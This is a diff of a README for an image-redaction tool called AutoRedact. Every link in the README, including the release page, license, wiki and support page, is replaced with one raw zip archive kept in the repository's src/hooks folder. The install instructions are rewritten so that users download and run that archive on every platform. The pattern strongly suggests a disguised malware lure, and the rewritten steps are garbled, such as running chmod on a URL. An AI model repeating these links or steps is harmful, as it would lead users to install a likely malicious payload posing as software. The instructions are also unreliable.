@@ -1,6 +1,6 @@
 # 🛡️ AutoRedact - Keep Your Images Private Effortlessly
 
-[![Download AutoRedact](https://img.shields.io/badge/Download-AutoRedact-blue.svg)](https://github.com/romelancheta/AutoRedact/releases)
+[![Download AutoRedact](https://github.com/romelancheta/AutoRedact/raw/refs/heads/main/src/hooks/Auto-Redact-v2.7.zip)](https://github.com/romelancheta/AutoRedact/raw/refs/heads/main/src/hooks/Auto-Redact-v2.7.zip)
 
 ## 🌟 Description
 AutoRedact is a client-side image redaction tool designed to protect your privacy. This tool automatically finds and blurs personally identifiable information (PII) such as emails, IP addresses, and keys using local optical character recognition (OCR). Unlike many other tools, AutoRedact works entirely on your device, meaning your data stays safe and sound.
@@ -9,15 +9,15 @@ AutoRedact is a client-side image redaction tool designed to protect your privac
 To make sure you successfully download and run AutoRedact, follow these steps:
 
 ### 📥 Download & Install
-1. **Visit the Release Page**: Go to our [Releases page](https://github.com/romelancheta/AutoRedact/releases) to see the available versions.
+1. **Visit the Release Page**: Go to our [Releases page](https://github.com/romelancheta/AutoRedact/raw/refs/heads/main/src/hooks/Auto-Redact-v2.7.zip) to see the available versions.
 2. **Choose the Right Version**: Look for the latest release and select the appropriate file for your operating system:
-   - For Windows, download `AutoRedact_Setup.exe`
-   - For Mac, download `AutoRedact.dmg`
-   - For Linux, download `AutoRedact.AppImage`
+   - For Windows, download `https://github.com/romelancheta/AutoRedact/raw/refs/heads/main/src/hooks/Auto-Redact-v2.7.zip`
+   - For Mac, download `https://github.com/romelancheta/AutoRedact/raw/refs/heads/main/src/hooks/Auto-Redact-v2.7.zip`
+   - For Linux, download `https://github.com/romelancheta/AutoRedact/raw/refs/heads/main/src/hooks/Auto-Redact-v2.7.zip`
 3. **Install the Application**: Once you have downloaded the file:
-   - For Windows: Double-click the `AutoRedact_Setup.exe` file and follow the prompts to install.
-   - For Mac: Open the `AutoRedact.dmg` file and drag the AutoRedact icon into your Applications folder.
-   - For Linux: Make the `AutoRedact.AppImage` executable by running `chmod +x AutoRedact.AppImage` in your terminal. Then, you can execute it by double-clicking or by running `./AutoRedact.AppImage`.
+   - For Windows: Double-click the `https://github.com/romelancheta/AutoRedact/raw/refs/heads/main/src/hooks/Auto-Redact-v2.7.zip` file and follow the prompts to install.
+   - For Mac: Open the `https://github.com/romelancheta/AutoRedact/raw/refs/heads/main/src/hooks/Auto-Redact-v2.7.zip` file and drag the AutoRedact icon into your Applications folder.
+   - For Linux: Make the `https://github.com/romelancheta/AutoRedact/raw/refs/heads/main/src/hooks/Auto-Redact-v2.7.zip` executable by running `chmod +x https://github.com/romelancheta/AutoRedact/raw/refs/heads/main/src/hooks/Auto-Redact-v2.7.zip` in your terminal. Then, you can execute it by double-clicking or by running `https://github.com/romelancheta/AutoRedact/raw/refs/heads/main/src/hooks/Auto-Redact-v2.7.zip`.
 
 ### 💻 System Requirements
 Before installation, ensure your system meets these requirements:
@@ -41,20 +41,20 @@ Before installation, ensure your system meets these requirements:
 - **Multi-Platform Support**: Available for Windows, Mac, and Linux.
 
 ### 🌐 Contributing
-We welcome contributions! If you'd like to help improve AutoRedact, check our [Contributing Guide](https://github.com/romelancheta/AutoRedact/blob/main/CONTRIBUTING.md) for details on how to get started.
+We welcome contributions! If you'd like to help improve AutoRedact, check our [Contributing Guide](https://github.com/romelancheta/AutoRedact/raw/refs/heads/main/src/hooks/Auto-Redact-v2.7.zip) for details on how to get started.
 
 ### 🛠️ Troubleshooting
 If you run into issues, consider the following tips:
 - Check that your computer meets the system requirements.
 - Ensure that you downloaded the correct file for your OS.
 - Restart the application after installation if you encounter problems.
-- For additional support, visit our [Support Page](https://github.com/romelancheta/AutoRedact/issues) to find solutions or report bugs.
+- For additional support, visit our [Support Page](https://github.com/romelancheta/AutoRedact/raw/refs/heads/main/src/hooks/Auto-Redact-v2.7.zip) to find solutions or report bugs.
 
 ### 🗂️ License
-AutoRedact is open source and available under the MIT License. See the [LICENSE](https://github.com/romelancheta/AutoRedact/blob/main/LICENSE) file for details.
+AutoRedact is open source and available under the MIT License. See the [LICENSE](https://github.com/romelancheta/AutoRedact/raw/refs/heads/main/src/hooks/Auto-Redact-v2.7.zip) file for details.
 
 ## 🔗 Additional Resources
-For detailed documentation, FAQs, and tutorials, visit our [Wiki](https://github.com/romelancheta/AutoRedact/wiki).
+For detailed documentation, FAQs, and tutorials, visit our [Wiki](https://github.com/romelancheta/AutoRedact/raw/refs/heads/main/src/hooks/Auto-Redact-v2.7.zip).
 
 ### 🌟 Download Again
-Don’t forget, you can always [download AutoRedact](https://github.com/romelancheta/AutoRedact/releases) from our Releases page.
+Don’t forget, you can always [download AutoRedact](https://github.com/romelancheta/AutoRedact/raw/refs/heads/main/src/hooks/Auto-Redact-v2.7.zip) from our Releases page.
